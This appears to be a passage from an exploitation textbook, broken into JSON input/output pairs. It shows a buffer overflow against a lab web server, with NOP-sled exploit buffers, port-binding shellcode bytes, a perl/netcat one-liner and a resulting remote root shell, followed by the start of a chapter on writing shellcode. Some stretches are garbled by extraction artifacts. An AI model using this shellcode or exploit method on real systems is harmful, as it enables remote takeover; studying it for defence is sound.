90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n276 0x400\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 31 c0 31 db | ............1.1.\n31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 2f 2f 73 68 | 1......j.XQh//sh\n68 2f 62 69 6e 89 e3 51 89 e2 53 89 e1 cd 80 90 | h/bin..Q..S.....\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................\n0d 0a | ..\nreader@hacking:~/booksrc $\nBack on the terminal running the tinyweb program, the output shows the\nexploit buffer was received and the shellcode is executed. This will provide a\nrootshell, but only for the console running the server. Unfortunately, we aren’t\nat the console, so this won’t do us any good. At the server console, we see the\nfollowing:\nreader@hacking:~/booksrc $ ./tinyweb\nAccepting web requests on port 80\nGot request from 127.0.0.1:53908 \"GET / HTTP/1.1\"\nOpening './webroot/index.html' 200 OK\nGot request from 127.0.0.1:40668 \"GET /image.jpg HTTP/1.1\"\nOpening './webroot/image.jpg' 200 OK\nG(cid:0)ot(cid:0) (cid:0)re(cid:0)q(cid:0)u(cid:0)es(cid:0)t(cid:0) f(cid:0)r(cid:0)o(cid:0)m (cid:0)1(cid:0)27(cid:0).(cid:0)0(cid:0).0(cid:0).(cid:0)1:(cid:0)5(cid:0)8(cid:0)50(cid:0)4(cid:0) (cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)\"(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0) (cid:0) (cid:0) (cid:0)(cid:0)(cid:0)\n1 1 1 j (cid:0)(cid:0) (cid:0)(cid:0) (cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0) (cid:0)X(cid:0)Qh(cid:0)/(cid:0)/s(cid:0)h(cid:0)h(cid:0)/b(cid:0)i(cid:0)n(cid:0)(cid:0)Q(cid:0)(cid:0)(cid:0)S(cid:0) (cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n\"\nNOT HTTP!\nsh-3.2#\nNetworking 277"
  },
  {
    "input": "0x483 Port-Binding Shellcode",
    "output": "The vulnerability certainly exists, but the shellcode doesn’t do what we\nwant in this case. Since we’re not at the console, shellcode is just a self-\ncontained program, designed to take over another program to open a shell.\nOnce control of the program’s execution pointer is taken, the injected\nshellcode can do anything. There are many different types of shellcode\nthatcan be used in different situations (or payloads). Even though not all\nshellcode actually spawns a shell, it’s still commonly called shellcode.\n0x483 Port-Binding Shellcode\nWhen exploiting a remote program, spawning a shell locally is pointless.\nPort-binding shellcode listens for a TCP connection on a certain port\nandserves up the shell remotely. Assuming you already have port-binding\nshellcode ready, using it is simply a matter of replacing the shellcode bytes\ndefined in the exploit. Port-binding shellcode is included in the LiveCD that\nwill bind to port 31337. These shellcode bytes are shown in the output below.\nreader@hacking:~/booksrc $ wc -c portbinding_shellcode\n92 portbinding_shellcode\nreader@hacking:~/booksrc $ hexdump -C portbinding_shellcode\n00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|\n00000010 96 6a 66 58 43 52 66 68 7a 69 66 53 89 e1 6a 10 |.jfXCRfhzifS..j.|\n00000020 51 56 89 e1 cd 80 b0 66 43 43 53 56 89 e1 cd 80 |QV.....fCCSV....|\n00000030 b0 66 43 52 52 56 89 e1 cd 80 93 6a 02 59 b0 3f |.fCRRV.....j.Y.?|\n00000040 cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 2f 62 |..Iy...Rh//shh/b|\n00000050 69 6e 89 e3 52 89 e2 53 89 e1 cd 80 |in..R..S....|\n0000005c\nreader@hacking:~/booksrc $ od -tx1 portbinding_shellcode | cut -c8-80 | sed -e 's/ /\\\\x/g'\n\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\n\\x96\\x6a\\x66\\x58\\x43\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x10\n\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x53\\x56\\x89\\xe1\\xcd\\x80\n\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\n\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\n\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80\nreader@hacking:~/booksrc $\nAfter some quick formatting, these bytes are swapped into the shellcode\nbytes of the tinyweb_exploit.c program, resulting in tinyweb_exploit2.c. The\nnew shellcode line is shown below.\nNew Line from tinyweb_exploit2.c\nchar shellcode[]=\n\"\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\"\n\"\\x96\\x6a\\x66\\x58\\x43\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x10\"\n\"\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x53\\x56\\x89\\xe1\\xcd\\x80\"\n\"\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\"\n\"\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\"\n\"\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80\";\n// Port-binding shellcode on port 31337\n278 0x400\nWhen this exploit is compiled and run against a host running tinyweb\nserver, the shellcode listens on port 31337 for a TCP connection. In the\noutput below, a program called nc is used to connect to the shell. This pro-\ngram is netcat (nc for short), which works like that cat program but over the\nnetwork. We can’t just use telnet to connect since it automatically terminates\nall outgoing lines with '\\r\\n'. The output of this exploit is shown below. The\n-vv command-line option passed to netcat is just to make it more verbose.\nreader@hacking:~/booksrc $ gcc tinyweb_exploit2.c\nreader@hacking:~/booksrc $ ./a.out 127.0.0.1\nExploit buffer:\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 6a 66 58 99 | ............jfX.\n31 db 43 52 6a 01 6a 02 89 e1 cd 80 96 6a 66 58 | 1.CRj.j......jfX\n43 52 66 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 | CRfhzifS..j.QV..\ncd 80 b0 66 43 43 53 56 89 e1 cd 80 b0 66 43 52 | ...fCCSV.....fCR\n52 56 89 e1 cd 80 93 6a 02 59 b0 3f cd 80 49 79 | RV.....j.Y.?..Iy\nf9 b0 0b 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 | ...Rh//shh/bin..\n52 89 e2 53 89 e1 cd 80 90 90 90 90 90 90 90 90 | R..S............\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................\n0d 0a | ..\nreader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami\nroot\nls -l /etc/passwd\n-rw-r--r-- 1 root root 1545 Sep 9 16:24 /etc/passwd\nNetworking 279\nEven though the remote shell doesn’t display a prompt, it still accepts\ncommands and returns the output over the network.\nA program like netcat can be used for many other things. It’s designed to\nwork like a console program, allowing standard input and output to be piped\nand redirected. Using netcat and the port-binding shellcode in a file, the same\nexploit can be carried out on the command line.\nreader@hacking:~/booksrc $ wc -c portbinding_shellcode\n92 portbinding_shellcode\nreader@hacking:~/booksrc $ echo $((540+4 - 300 - 92))\n152\nreader@hacking:~/booksrc $ echo $((152 / 4))\n38\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x300';\n> cat portbinding_shellcode\n>(cid:0) (cid:0)p(cid:0)er(cid:0)l(cid:0) -(cid:0)e(cid:0) (cid:0)'p(cid:0)r(cid:0)in(cid:0)t(cid:0) (cid:0)\"\\(cid:0)x(cid:0)8(cid:0)8\\(cid:0)x(cid:0)f6(cid:0)\\(cid:0)x(cid:0)ff(cid:0)\\(cid:0)xb(cid:0)f(cid:0)\"(cid:0)x3(cid:0)8(cid:0) .(cid:0) (cid:0)\\(cid:0)r\\(cid:0)n(cid:0)\"'(cid:0))(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0) (cid:0) (cid:0) (cid:0)(cid:0) (cid:0)\n(cid:0)(cid:0) (cid:0)(cid:0) (cid:0) (cid:0)(cid:0) (cid:0) (cid:0)(cid:0) (cid:0) (cid:0) (cid:0)(cid:0) jfX 1 CRj j jfXC\nRfhzifS j QV fCCSV fCRRV j Y ? Iy (cid:0)(cid:0) (cid:0)(cid:0) (cid:0)(cid:0) (cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)\n(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)Rh(cid:2)/(cid:2)/s(cid:2)h(cid:2)h(cid:2)/b(cid:2)i(cid:2)n(cid:2)(cid:2)R(cid:2)(cid:2)(cid:2)S(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)\n(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)(cid:2)\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x300'; cat portbinding_shellcode;\nperl -e 'print \"\\x88\\xf6\\xff\\xbf\"x38 . \"\\r\\n\"') | nc -v -w1 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ nc -v 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami\nroot\nIn the output above, first the length of the port-binding shellcode is\nshown to be 92 bytes. The return address is found 540 bytes from the start of\nthe buffer, so with a 300-byte NOP sled and 92 bytes of shellcode, there are\n152 bytes to the return address overwrite. This means that if the target return\naddress is repeated 38 times at the end of the buffer, the last one should do\nthe overwrite. Finally, the buffer is terminated with '\\r\\n'. The commands\nthat build the buffer are grouped with parentheses to pipe the buffer into\nnetcat. netcat connects to the tinyweb program and sends the buffer. After\nthe shellcode runs, netcat needs to be broken out of by pressing CTRL-C,\nsince the original socket connection is still open. Then, netcat is used again\nto connect to the shell bound on port 31337.\n280 0x400"
  },
  {
    "input": "0x500: Shellcode",
    "output": "0x500\nS H E L L C O D E\nSo far, the shellcode used in our exploits has been\njust a string of copied and pasted bytes. We have seen\nstandard shell-spawning shellcode for local exploits\nand port-binding shellcode for remote ones. Shellcode\nis also sometimes referred to as an exploit payload, since these self-contained\nprograms do the real work once a program has been hacked. Shellcode usually\nspawns a shell, as that is an elegant way to hand off control; but it can do any-\nthing a program can do.\nUnfortunately, for many hackers the shellcode story stops at copying and\npasting bytes. These hackers are just scratching the surface of what’s possible.\nCustom shellcode gives you absolute control over the exploited program.\nPerhaps you want your shellcode to add an admin account to /etc/passwd\nor to automatically remove lines from log files. Once you know how to write\nyour own shellcode, your exploits are limited only by your imagination. In\naddition, writing shellcode develops assembly language skills and employs a\nnumber of hacking techniques worth knowing."
  },
  {
    "input": "0x510 Assembly vs. C",
    "output": "0x510 Assembly vs. C\nThe shellcode bytes are actually architecture-specific machine instructions,\nso shellcode is written using the assembly language. Writing a program in\nassembly is different than writing it in C, but many of the principles are similar.\nThe operating system manages things like input, output, process control, file\naccess, and network communication in the kernel. Compiled C programs\nultimately perform these tasks by making system calls to the kernel. Different\noperating systems have different sets of system calls.\nIn C, standard libraries are used for convenience and portability. A C pro-\ngram that uses printf() to output a string can be compiled for many different\nsystems, since the library knows the appropriate system calls for various archi-\ntectures. A C program compiled on an x86 processor will produce x86 assembly\nlanguage.\nBy definition, assembly language is already specific to a certain processor\narchitecture, so portability is impossible. There are no standard libraries;\ninstead, kernel system calls have to be made directly. To begin our comparison,\nlet’s write a simple C program, then rewrite it in x86 assembly.\nhelloworld.c\n#include <stdio.h>\nint main() {\nprintf(\"Hello, world!\\n\");\nreturn 0;\n}\nWhen the compiled program is run, execution flows through the standard\nI/O library, eventually making a system call to write the string Hello, world! to\nthe screen. The strace program is used to trace a program’s system calls. Used\non the compiled helloworld program, it shows every system call that program\nmakes.\nreader@hacking:~/booksrc $ gcc helloworld.c\nreader@hacking:~/booksrc $ strace ./a.out\nexecve(\"./a.out\", [\"./a.out\"], [/* 27 vars */]) = 0\nbrk(0) = 0x804a000\naccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef6000\naccess(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory)\nopen(\"/etc/ld.so.cache\", O_RDONLY) = 3\nfstat64(3, {st_mode=S_IFREG|0644, st_size=61323, ...}) = 0\nmmap2(NULL, 61323, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7ee7000\nclose(3) = 0\naccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\nopen(\"/lib/tls/i686/cmov/libc.so.6\", O_RDONLY) = 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\20Z\\1\\000\"..., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0755, st_size=1248904, ...}) = 0\nmmap2(NULL, 1258876, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7db3000\nmmap2(0xb7ee0000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x12c) =\n0xb7ee0000\n282 0x500\nmmap2(0xb7ee4000, 9596, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =\n0xb7ee4000\nclose(3) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db2000\nset_thread_area({entry_number:-1 -> 6, base_addr:0xb7db26b0, limit:1048575, seg_32bit:1,\ncontents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nmprotect(0xb7ee0000, 8192, PROT_READ) = 0\nmunmap(0xb7ee7000, 61323) = 0\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef5000\nwrite(1, \"Hello, world!\\n\", 13Hello, world!\n) = 13\nexit_group(0) = ?\nProcess 11528 detached\nreader@hacking:~/booksrc $\nAs you can see, the compiled program does more than just print a string.\nThe system calls at the start are setting up the environment and memory\nfor the program, but the important part is the write() syscall shown in bold.\nThis is what actually outputs the string.\nThe Unix manual pages (accessed with the man command) are sep-\narated into sections. Section 2 contains the manual pages for system calls,\nsoman 2 write will describe the use of the write() system call:\nMan Page for the write() System Call\nWRITE(2) Linux Programmer's Manual\nWRITE(2)\nNAME\nwrite - write to a file descriptor\nSYNOPSIS\n#include <unistd.h>\nssize_t write(int fd, const void *buf, size_t count);\nDESCRIPTION\nwrite() writes up to count bytes to the file referenced by the file\ndescriptor fd from the buffer starting at buf. POSIX requires that a\nread() which can be proved to occur after a write() returns the new\ndata. Note that not all file systems are POSIX conforming.\nThe strace output also shows the arguments for the syscall. The buf\nandcount arguments are a pointer to our string and its length. The fd\nargument of 1 is a special standard file descriptor. File descriptors are used\nfor almost everything in Unix: input, output, file access, network sockets,\nand so on. A file descriptor is similar to a number given out at a coat check.\nOpening a file descriptor is like checking in your coat, since you are given\nanumber that can later be used to reference your coat. The first three file\ndescriptor numbers (0, 1, and 2) are automatically used for standard input,\noutput, and error. These values are standard and have been defined in several\nplaces, such as the /usr/include/unistd.h file on the following page.\nShellcode 283"
  },
  {
    "input": "0x511 Linux System Calls in Assembly",
    "output": "From /usr/include/unistd.h\n/* Standard file descriptors. */\n#define STDIN_FILENO 0 /* Standard input. */\n#define STDOUT_FILENO 1 /* Standard output. */\n#define STDERR_FILENO 2 /* Standard error output. */\nWriting bytes to standard output’s file descriptor of 1 will print the bytes;\nreading from standard input’s file descriptor of 0 will input bytes. The standard\nerror file descriptor of 2 is used to display the error or debugging messages\nthat can be filtered from the standard output.\n0x511 Linux System Calls in Assembly\nEvery possible Linux system call is enumerated, so they can be referenced\nbynumbers when making the calls in assembly. These syscalls are listed in\n/usr/include/asm-i386/unistd.h.\nFrom /usr/include/asm-i386/unistd.h\n#ifndef _ASM_I386_UNISTD_H_\n#define _ASM_I386_UNISTD_H_\n/*\n* This file contains the system call numbers.\n*/\n#define __NR_restart_syscall 0\n#define __NR_exit 1\n#define __NR_fork 2\n#define __NR_read 3\n#define __NR_write 4\n#define __NR_open 5\n#define __NR_close 6\n#define __NR_waitpid 7\n#define __NR_creat 8\n#define __NR_link 9\n#define __NR_unlink 10\n#define __NR_execve 11\n#define __NR_chdir 12\n#define __NR_time 13\n#define __NR_mknod 14\n#define __NR_chmod 15\n#define __NR_lchown 16\n#define __NR_break 17\n#define __NR_oldstat 18\n#define __NR_lseek 19\n#define __NR_getpid 20\n#define __NR_mount 21\n#define __NR_umount 22\n#define __NR_setuid 23\n#define __NR_getuid 24\n284 0x500\n#define __NR_stime 25\n#define __NR_ptrace 26\n#define __NR_alarm 27\n#define __NR_oldfstat 28\n#define __NR_pause 29\n#define __NR_utime 30\n#define __NR_stty 31\n#define __NR_gtty 32\n#define __NR_access 33\n#define __NR_nice 34\n#define __NR_ftime 35\n#define __NR_sync 36\n#define __NR_kill 37\n#define __NR_rename 38\n#define __NR_mkdir 39\n...\nFor our rewrite of helloworld.c in assembly, we will make a system call to\nthe write() function for the output and then a second system call to exit()\nso the process quits cleanly. This can be done in x86 assembly using just two\nassembly instructions: mov and int.\nAssembly instructions for the x86 processor have one, two, three, or no\noperands. The operands to an instruction can be numerical values, memory\naddresses, or processor registers. The x86 processor has several 32-bit registers\nthat can be viewed as hardware variables. The registers EAX, EBX, ECX, EDX,\nESI, EDI, EBP, and ESP can all be used as operands, while the EIP register\n(execution pointer) cannot.\nThe mov instruction copies a value between its two operands. Using Intel\nassembly syntax, the first operand is the destination and the second is the\nsource. The int instruction sends an interrupt signal to the kernel, defined\nby its single operand. With the Linux kernel, interrupt 0x80 is used to tell\nthe kernel to make a system call. When the int 0x80 instruction is executed, the\nkernel will make a system call based on the first four registers. The EAX register\nis used to specify which system call to make, while the EBX, ECX, and EDX\nregisters are used to hold the first, second, and third arguments to the system\ncall. All of 